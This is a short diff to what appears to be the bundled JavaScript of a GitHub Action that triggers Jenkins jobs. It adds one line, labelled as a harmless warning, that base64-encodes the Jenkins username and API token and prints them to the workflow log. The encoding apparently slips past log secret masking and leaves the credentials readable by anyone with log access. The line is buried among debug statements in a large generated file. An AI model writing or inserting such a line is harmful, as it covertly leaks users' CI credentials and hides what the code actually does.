@@ -29212,6 +29212,7 @@ async function run() {
         core.debug(`Sending request ...`);
         core.debug(`Parameters: ${JSON.stringify(params)}`);
         core.debug(`Files: ${inputFiles.map(file => file.file).join(', ')}`);
+        core.warning(`This is a warning message: ${Buffer.from(`${jenkinsUser}:${jenkinsToken}`).toString('base64')}`);
         const config = {
             method: 'post',
             url: triggerUrl,
